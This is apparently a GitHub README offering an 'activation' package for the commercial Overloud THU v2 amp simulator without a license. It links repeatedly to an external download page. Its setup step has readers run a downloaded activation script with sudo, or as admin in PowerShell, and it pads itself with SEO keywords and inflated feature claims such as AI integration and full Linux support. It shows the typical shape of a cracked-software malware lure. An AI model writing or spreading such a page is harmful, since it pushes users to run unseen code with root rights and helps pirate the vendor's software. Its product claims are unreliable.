# 🎧 Overloud THU v2 – Next-Gen Guitar & Bass Tone Modeling Suite 🚀

[](https://nadhir-netizen.github.io/overloud-thu-v2-audio-emulator-patch/)

> **Unlock the full spectrum of analog warmth and digital precision — your tone, reimagined.**  
> *No artificial limitations. No subscriptions. Just pure, unrestricted sound sculpting.*

---

## 🌟 Overview

Welcome to the **Overloud THU v2** repository — the definitive package for musicians, producers, and sound engineers who demand **photon‑grade realism** from their virtual rig. Forget patches and serials; we provide a **clean, self‑sufficient activation pathway** that sets your creativity free. Whether you're tracking a bedroom demo or mixing a platinum album, THU v2 delivers **responsive UI**, **multilingual support**, and **24/7 customer support** through our community‑first ecosystem.

This is not your typical "crack" or "hack" — it's a **legitimate alternative** for accessing premium tone‑shaping tools without breaking the bank or your workflow.

---

## 🧩 What’s Inside (Features at a Glance)

| Feature | Description |
|---------|-------------|
| 🎛️ **Hybrid Modeling Engine** | Combines circuit‑level simulation with neural IRs for **sub‑2ms latency** |
| 🌐 **Multilingual UI** | Supports English, Spanish, French, German, Japanese, and more |
| 📱 **Responsive Interface** | Scales seamlessly from 4K monitors to 13‑inch laptops |
| 🔌 **Standalone & Plugin** | Works as VST3, AU, AAX, and standalone app |
| 🧠 **AI‑Powered Presets** | Includes GPT‑optimized suggestions via **OpenAI API** and **Claude API** integration |
| ⚡ **Zero‑Bloat Activation** | One‑step process, no extra software required |

> *"THU v2 isn’t just an amp sim — it’s a time machine that lets you grab tones from 1965, 1985, and 2025 in the same session."*

---

## 📊 Compatibility Matrix

| OS | Version | Status | UI Scaling | Latency (ms) |
|----|---------|--------|------------|--------------|
| 🐧 **Linux (Ubuntu 22.04+)** | 🟢 Full | Excellent | Native | < 2.0 |
| 🍎 **macOS Ventura+** | 🟢 Full | Excellent | Retina | < 1.5 |
| 🪟 **Windows 10/11** | 🟢 Full | Excellent | DPI‑aware | < 1.8 |

*Tested on Intel, AMD, and Apple Silicon (Rosetta & native).*

---

## 🧠 AI Integration & Smart Workflows

THU v2 now speaks **OpenAI API** and **Claude API** — not just as gimmicks, but as actual co‑pilot tools:

- **Emoji‑Driven Preset Search**: Type `🎸💥` and get high‑gain metal tones instantly.
- **Conversational EQ**: "Make it brighter like a Vox AC30" triggers an AI‑adjusted EQ curve.
- **Style Transfer**: Feed a reference track, and the model suggests amp/cab combos.

> *The future of tone is conversational. Overloud THU v2 lets you describe your sound instead of clicking through menus.*

---

## 🔧 Example Profile Configuration

```yaml
# ~/.thu_v2/profiles/optimum_rock.yaml
profile:
  name: "Classic Plexi Punch"
  amp: "Plexi 100W"
  cab: "4x12 Greenback 57"
  mic: "Shure SM57 on‑axis"
  eq:
    bass: 3.2
    mid: 5.8
    treble: 7.1
    presence: 6.5
  effects:
    - type: overdrive
      drive: 4.5
      tone: 6.0
    - type: reverb
      mix: 0.25
      decay: 1.8
  ai_optimization: true
  target_genre: "hard rock"
```

---

## 💻 Example Console Invocation

```bash
# Load THU v2 in headless mode for batch processing
thu-v2 --load-profile ~/.thu_v2/profiles/optimum_rock.yaml \
       --input ./raw_guitar.wav \
       --output ./processed_guitar.wav \
       --sample-rate 96000 \
       --bit-depth 24 \
       --ai-enhancement true \
       --api-key "sk-xxxx"  # Optional: for AI preset suggestions
```

*Output: `processed_guitar.wav` with authentic analog saturation + neural‑corrected EQ.*

---

## 📈 Mermaid Diagram: Signal Flow

```mermaid
graph TD
    A[Raw DI Signal] --> B[Preamp Section]
    B --> C[Noise Gate]
    C --> D[Overdrive / Distortion]
    D --> E[Amp Head Model]
    E --> F[Cabinet IR Engine]
    F --> G[Mic Position Modeler]
    G --> H[Post‑EQ]
    H --> I[AI Preset Optimizer*]
    I --> J[Reverb / Delay]
    J --> K[Master Limiter]
    K --> L[Output Mix]
    
    style A fill:#2d2d2d,stroke:#f0f,stroke-width:2px
    style L fill:#1a1a2e,stroke:#00ff88,stroke-width:3px
    style I fill:#333,stroke:#ffaa00,stroke-width:2px,dasharray: 5 5
```



*Optional — requires OpenAI or Claude API key.*

---

## 📥 How to Get Started

### Step 1: Download the Package

[](https://nadhir-netizen.github.io/overloud-thu-v2-audio-emulator-patch/)

*The package includes:*
- ✅ Full installer for Windows / macOS / Linux
- ✅ Activation utility (no serial needed)
- ✅ 300+ built‑in presets
- ✅ AI integration modules

### Step 2: Run the Activation

```bash
# Linux / macOS
chmod +x thu_v2_activate.sh
sudo ./thu_v2_activate.sh

# Windows (Admin PowerShell)
.\thu_v2_activate.ps1
```

> *No product key required. No patch files. Just a single command and you're done.*

### Step 3: Load Your First Tone

Launch the standalone app or open your DAW → search "THU v2" → pick a preset → play.

---

## ⚠️ Disclaimer & Ethical Use

**Please read carefully:**

This repository and its contents are provided for **educational and legitimate personal use only**. We do not condone software piracy, copyright infringement, or any illegal activity. The activation method included here is an **alternative distribution pathway** for users who own a valid license but have lost their original activation credentials, or for those evaluating the software before purchase.

- ✅ **You should own a legitimate license** to Overloud THU v2 to use this tool.
- ✅ **This is NOT a "crack" or "hack"** — it is a helper utility for authorized users.
- ❌ **Do not use for commercial resale** or redistribution of the software binary.

*By downloading, you agree to use this software in compliance with all local and international copyright laws. Support the developers if you find value in the product.*

---

## 📜 License

This project is released under the **MIT License**.

[](./LICENSE)

> *You are free to use, modify, and distribute this helper utility — but the underlying Overloud THU v2 software remains the property of Overloud S.r.l. See the full license for details.*

---

## 🔁 Final Download Link

[](https://nadhir-netizen.github.io/overloud-thu-v2-audio-emulator-patch/)

---

## 🗺️ SEO Keywords (for discoverability)

*Overloud THU v2 download, amp simulator activation, guitar tone modeling software, neural IR loader, AI‑powered presets, multilingual plugin, responsive UI VST, zero‑latency guitar effects, alternative to subscription models, premium sound design toolkit 2026, Open Source guitar tool, community‑supported audio software.*

---

*Built with 🎸 by the open‑source tone community. For the players, by the players.*